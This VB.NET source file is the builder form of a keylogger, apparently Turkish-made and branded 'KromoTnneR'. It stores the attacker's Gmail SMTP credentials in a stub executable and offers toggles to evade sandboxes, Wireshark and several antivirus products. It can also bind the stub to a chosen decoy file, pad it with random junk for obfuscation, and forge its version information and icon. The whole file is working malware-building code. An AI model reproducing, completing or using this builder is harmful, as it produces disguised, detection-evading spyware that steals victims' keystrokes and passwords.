Imports System.IO
Imports System.Net.Mail
Imports Microsoft.Win32
Imports System.Windows.Forms.Application
Imports System.CodeDom.Compiler
Imports System.Reflection
Imports System.Drawing.Icon

Public Class Form1
    Dim stub, gmail, şifre, dk, nod, badd, sandb, kyscr, ws, ksper, bd, zna, anb, nrmn, atm, arm, killer, site1, site2, s1, s2, sdk, yer As String
    Dim tarih, tarih0 As Integer
    Dim str As String = ""
    Dim stm As String = "cftmon"
    Const FileSplit = "|keylogger|"
    Dim fileData() As Byte
    Dim encoded As Byte
    Dim code As String = My.Resources.dl
    Dim rand As New Random()

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Public Const key As String = "pSILlzCwXBSrQ1Vb72t6bIXtKRzAHJklNNL94gD8hIi9FwLiiVlr"


    Public Function randomChars(ByVal number As Integer)

        Dim therandomthing As String = ""
        Dim charsnumbers As Integer
        Dim charsUL As Integer

        Dim charsL As String = "abcdefghijklmnopqrstuvwxyz"
        Dim charsU As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

        Dim numberC As Integer = rand.Next(1, number + 1)
        Dim numberN As Integer = number - numberC

        For i = 1 To number
            charsnumbers = rand.Next(1, 3)
            If charsnumbers = 1 And numberC > 0 Then
                charsUL = rand.Next(1, 3)
                If charsUL = 1 Then
                    therandomthing = therandomthing & charsL(rand.Next(0, 26))
                Else
                    therandomthing = therandomthing & charsU(rand.Next(0, 26))
                End If
            Else
                therandomthing = therandomthing & rand.Next(0, 9)
            End If
        Next

        Return therandomthing

    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try
            For Fadein = 0.0 To 1.1 Step 0.1
                Me.Opacity = Fadein
                Me.Refresh()
                Threading.Thread.Sleep(100)
            Next
            Me.ControlBox = True

        Catch

        End Try

    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox6.Text = Nothing Then CheckBox5.Checked = False
        If chksandbox.Checked = True Then
            sandb = 1
        Else
            sandb = 0
        End If
        If chkkeyscrambler.Checked = True Then
            kyscr = 1
        Else
            kyscr = 0
        End If
        If chkwireshark.Checked = True Then
            ws = 1
        Else
            ws = 0
        End If
        If chkkaspersky.Checked = True Then
            ksper = 1
        Else
            ksper = 0
        End If
        If chkbitdefender.Checked = True Then
            bd = 1
        Else
            bd = 0
        End If
        If chkanubis.Checked = True Then
            anb = 1
        Else
            anb = 0
        End If
        If chknorman.Checked = True Then
            nrmn = 1
        Else
            nrmn = 0
        End If
        If chknod.Checked = True Then
            nod = 1
        Else
            nod = 0
        End If
        If CheckBox2.Checked = True Then
            badd = 1
        Else
            badd = 0
        End If
        If CheckBox3.Checked = True Then
            atm = 1
        Else
            atm = 0
        End If
        If CheckBox4.Checked = True Then
            arm = 1
        Else
            arm = 0
        End If
        If CheckBox6.Checked = True Then
            killer = 1
        Else
            killer = 0
        End If
        If CheckBox7.Checked = True Then
            s1 = 1
        Else
            s1 = 0
        End If
        If CheckBox8.Checked = True Then
            s2 = 1
        Else
            s2 = 0
        End If
        If CheckBox5.Checked = True Then
            Check1()
        Else
            check0()
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim mail As New MailMessage()
        Dim SmtpServer As New SmtpClient
        SmtpServer.Credentials = New Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
        SmtpServer.Port = 587
        SmtpServer.Host = "smtp.gmail.com"
        SmtpServer.EnableSsl = True
        SmtpServer.EnableSsl = True
        mail.To.Add(TextBox1.Text)
        mail.From = New MailAddress(TextBox1.Text)
        mail.Subject = "|||ßy KromoTnneR Test Mail|||"
        mail.Body = "Bizi tercih ettiginiz için teşekkür ederiz. Test maili onaylanmıstır."

        SmtpServer.Send(mail)

    End Sub
    Private Sub TextBox1_MouseDown(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox1.MouseDown
        If TextBox1.Text = "example@gmail.com" Then
            TextBox1.Text = Nothing
        End If
    End Sub
    Private Sub TextBox2_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles TextBox2.MouseDown
        If TextBox2.Text = "Password" Then
            TextBox2.Text = Nothing
        End If
    End Sub
    Private Sub TextBox4_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles TextBox4.MouseDown
        If TextBox4.Text = "MyLogger" Then
            TextBox4.Text = Nothing
        End If
    End Sub
    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox2.UseSystemPasswordChar = False
            CheckBox1.Text = "Karakter Gizle"
        Else
            TextBox2.UseSystemPasswordChar = True
            CheckBox1.Text = "Karakter Göster"
        End If
        If TextBox2.Text = "Password" Then
            TextBox2.Text = Nothing
        End If
    End Sub
    Private Sub NumericUpDown3_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown3.ValueChanged
        CheckBox7.Text = NumericUpDown3.Value & " Dakika Ara İle Site Aç"
    End Sub
    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            Using ofd As New OpenFileDialog
                ofd.Filter = "All Files *.*|*.*"
                ofd.Title = "Birleştirilecek Dosyayı Seçiniz."
                If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                    yer = ofd.FileName
                    TextBox6.Enabled = True
                    TextBox6.Text = ofd.SafeFileName

                Else
                    TextBox6.Enabled = False
                    TextBox6.Text = Nothing
                    yer = ""
                End If
            End Using

        End If
    End Sub
    Private Sub CheckBox6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            NumericUpDown1.Enabled = True
            Label5.Enabled = True
        Else
            NumericUpDown1.Enabled = False
            Label5.Enabled = False
        End If
    End Sub
    Private Sub CheckBox7_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked = True Then
            NumericUpDown3.Enabled = True
            TextBox3.Enabled = True
        Else
            NumericUpDown3.Enabled = False
            TextBox3.Enabled = False
        End If
    End Sub
    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked = True Then
            TextBox5.Enabled = True
        Else
            TextBox5.Enabled = False
        End If
    End Sub
    Private Sub PictureBox1_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseClick
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            'Dim rIcon As Icon = Icon.ExtractAssociatedIcon(ofd.FileName)
            'PictureBox1.Image = rIcon.ToBitmap
            PictureBox1.Image = Image.FromFile(ofd.FileName) : PictureBox1.Tag = ofd.FileName
            If PictureBox1.Image Is Nothing Then
                PictureBox1.BackColor = Color.DimGray
            Else
                PictureBox1.BackColor = Color.Transparent
            End If
        End If
    End Sub
    Private Sub check0()
        site1 = TextBox3.Text
        site2 = TextBox5.Text
        tarih0 = Today.DayOfYear
        tarih = NumericUpDown1.Value
        gmail = TextBox1.Text
        şifre = TextBox2.Text
        dk = NumericUpDown2.Value
        str = TextBox4.Text
        Dim stb As String
        If TextBox15.Text = Nothing And TextBox16.Text = Nothing And TextBox17.Text = Nothing And TextBox18.Text = Nothing And TextBox19.Text = Nothing And PictureBox1.Image Is Nothing Then
            stb = str
        Else
            stb = "stub"
        End If
        'If File.Exists(Application.StartupPath & "\" & stb & ".exe") Then My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\" & str & ".exe")
        'Dim yol As String = Application.StartupPath & "\" & stb & ".exe"
        'IO.File.WriteAllBytes(yol, My.Resources.stub)
        FileOpen(1, Application.StartupPath & "\" & stb & ".exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default) '----------
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        If File.Exists(Application.StartupPath & "\" & str & ".exe") And File.Exists(Application.StartupPath & "\stub.exe") = False Then My.Computer.FileSystem.RenameFile(Application.StartupPath & "\" & str & ".exe", "stub.exe")

        FileOpen(1, Application.StartupPath & "\" + str + "1.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & gmail & FileSplit & şifre & FileSplit & dk & FileSplit & nod & FileSplit & badd & FileSplit & sandb & FileSplit & kyscr & FileSplit & bd & FileSplit & zna & FileSplit & anb & FileSplit & nrmn & FileSplit & atm & FileSplit & arm & FileSplit & ws & FileSplit & ksper & FileSplit & str & FileSplit & killer & FileSplit & tarih & FileSplit & tarih0 & FileSplit & site1 & FileSplit & site2 & FileSplit & s1 & FileSplit & s2 & FileSplit & sdk)
        FileClose(1)
        res()
        My.Computer.FileSystem.RenameFile(Application.StartupPath & "\" & str & "1.exe", str & ".exe")

        MessageBox.Show("The server has been created successfully.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)

    End Sub
    Private Sub Check1()
        site1 = TextBox3.Text
        site2 = TextBox5.Text
        tarih0 = Today.DayOfYear
        tarih = NumericUpDown1.Value
        gmail = TextBox1.Text
        şifre = TextBox2.Text
        dk = NumericUpDown2.Value
        str = TextBox4.Text
        'Dim yol As String = Application.StartupPath & "\stub.exe"
        'IO.File.WriteAllBytes(yol, My.Resources.stub)
        FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default) '----------
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)


        FileOpen(1, Application.StartupPath & "\" + str + "1.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & gmail & FileSplit & şifre & FileSplit & dk & FileSplit & nod & FileSplit & badd & FileSplit & sandb & FileSplit & kyscr & FileSplit & bd & FileSplit & zna & FileSplit & anb & FileSplit & nrmn & FileSplit & atm & FileSplit & arm & FileSplit & ws & FileSplit & ksper & FileSplit & str & FileSplit & killer & FileSplit & tarih & FileSplit & tarih0 & FileSplit & site1 & FileSplit & site2 & FileSplit & s1 & FileSplit & s2 & FileSplit & sdk)
        FileClose(1)
Z:
        Try
            If File.Exists(Application.StartupPath & "\" & str & "1.exe") = True Then
                Threading.Thread.Sleep(100)
                Using R As New Resources.ResourceWriter(Application.StartupPath & "\xyz.resources")

                    Dim oFile As System.IO.FileInfo
                    oFile = New System.IO.FileInfo(Application.StartupPath & "\" & str & "1.exe")

                    Dim oFileStream As System.IO.FileStream = oFile.OpenRead
                    Dim lBytes As Long = oFileStream.Length

                    If (lBytes > 0) Then
                        ReDim fileData(lBytes - 1)
                        oFileStream.Read(fileData, 0, lBytes)
                        oFileStream.Close()
                    End If

                    R.AddResource(System.IO.Path.GetFileName(Application.StartupPath & "\" & str & "1.exe"), Convert.ToBase64String(fileData))
                    Threading.Thread.Sleep(100)
                    Dim oFile2 As System.IO.FileInfo
                    oFile2 = New System.IO.FileInfo(yer)

                    Dim oFileStream2 As System.IO.FileStream = oFile2.OpenRead
                    Dim lBytes2 As Long = oFileStream2.Length

                    If (lBytes2 > 0) Then
                        ReDim fileData(lBytes2 - 1)
                        oFileStream2.Read(fileData, 0, lBytes2)
                        oFileStream2.Close()
                    End If

                    R.AddResource(System.IO.Path.GetFileName(yer), Convert.ToBase64String(fileData))
                    Threading.Thread.Sleep(100)
                End Using

                code = code.Replace("%mod%", "Module m" & randomChars(rand.Next(5, 10)))

                Threading.Thread.Sleep(100)
                For i = 1 To 18
                    code = code.Replace("%junk" & i & "%", "'" & randomChars(rand.Next(15, 50)))
                Next

                builder.gen(Application.StartupPath & "\" & stm & ".exe", code)

                If IO.File.Exists(Application.StartupPath & "\xyz.resources") Then
                    IO.File.Delete(Application.StartupPath & "\xyz.resources")
                End If

                Threading.Thread.Sleep(100)
                If File.Exists(Application.StartupPath & "\" & str & "1.exe") And File.Exists(Application.StartupPath & "\" & stm & ".exe") Then
                    File.Delete(Application.StartupPath & "\" & str & "1.exe")
                    My.Computer.FileSystem.RenameFile(Application.StartupPath & "\" & stm & ".exe", str & "1.exe")

                End If
            End If

        Catch
            GoTo Z
        End Try
        res()
        My.Computer.FileSystem.RenameFile(Application.StartupPath & "\" & str & "1.exe", str & ".exe")
        MessageBox.Show("The server has been created successfully.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)

    End Sub
    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        On Error GoTo B
        Shell("C:\Program Files\Google\Chrome\Application\chrome.exe www.facebook.com\furqanzy")
B:
        Shell("C:\Program Files (x86)\Google\Chrome\Application\chrome.exe www.facebook.com\furqanzy")
    End Sub
    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Form2.Show()
    End Sub
    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click

    End Sub
    Private Sub res()
        Try
A:
            If File.Exists(Application.StartupPath & "\" & str & ".exe") Then File.Delete(Application.StartupPath & "\" & str & ".exe")
            If File.Exists(Application.StartupPath & "\" & str & ".res") Then File.Delete(Application.StartupPath & "\" & str & ".res")
            If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
            If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
            If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
        Catch
            GoTo A
        End Try
        System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
        Dim source As String = My.Resources.AssemblyChange
        Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
        Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
        Dim cResults As CompilerResults
        Dim Options As New CompilerParameters()
        With Options
            .GenerateExecutable = True
            .OutputAssembly = Application.StartupPath & "\" & str & ".exe"
            .CompilerOptions = "/target:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .MainClass = "X"
        End With
        Dim otherfile As String
        Dim resfile As String
        Dim yy As String
        If Not yer = Nothing Then yy = (yer.Substring(0, yer.Length - 4)) Else yy = ""

        source = source.Replace("*Title*", TextBox15.Text)
        source = source.Replace("*Company*", TextBox16.Text)
        source = source.Replace("*Product*", TextBox17.Text)
        source = source.Replace("*Copyright*", TextBox18.Text)
        source = source.Replace("*Trademark*", TextBox19.Text)
        source = source.Replace("*version*", NumericUpDown1.Value.ToString & "." & NumericUpDown2.Value.ToString & "." & NumericUpDown3.Value.ToString & "." & NumericUpDown4.Value.ToString)
        cResults = Compiler.CompileAssemblyFromSource(Options, source)
        otherfile = Application.StartupPath & "\" & str & ".exe"
        resfile = Application.StartupPath & "\" & str & ".res"

        If CheckBox5.Checked = True Then
            otherfile = yy & ".exe" 'Application.StartupPath & "\" & str & ".exe"
            resfile = yy & ".res" 'Application.StartupPath & "\" & str & ".res"
        Else
            otherfile = Application.StartupPath & "\" & str & ".exe"
            resfile = Application.StartupPath & "\" & str & ".res"
        End If

        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & Application.StartupPath & "\" & str & "1.exe" & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & Application.StartupPath & "\" & str & "1.exe" & "," & Application.StartupPath & "\" & str & "1.exe" & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide)
        If Not PictureBox1.Image Is Nothing Then
            Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & Application.StartupPath & "\" & str & "1.exe" & ", " & Application.StartupPath & "\" & str & "1.exe" & ", " & PictureBox1.Tag.ToString & ", " & "icongroup, 1,0", AppWinStyle.Hide)
            'Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & Application.StartupPath & "\" & str & ".exe" & ", " & Application.StartupPath & "\" & str & "1.exe" & ", " & Application.StartupPath & "\ico.ico, icongroup, 1,0", AppWinStyle.Hide)

        End If
        Try
B:
            If File.Exists(Application.StartupPath & "\" & str & ".exe") Then File.Delete(Application.StartupPath & "\" & str & ".exe")
            If File.Exists(Application.StartupPath & "\" & str & ".res") Then File.Delete(Application.StartupPath & "\" & str & ".res")
            If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
            If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
            If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
            'If File.Exists(Application.StartupPath & "\stub.exe") = True Then File.Delete(Application.StartupPath & "\stub.exe")
        Catch
            GoTo B
        End Try
    End Sub


    Private Sub Form1_Load_1(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub TextBox15_TextChanged(sender As Object, e As EventArgs) Handles TextBox15.TextChanged

    End Sub
End Class

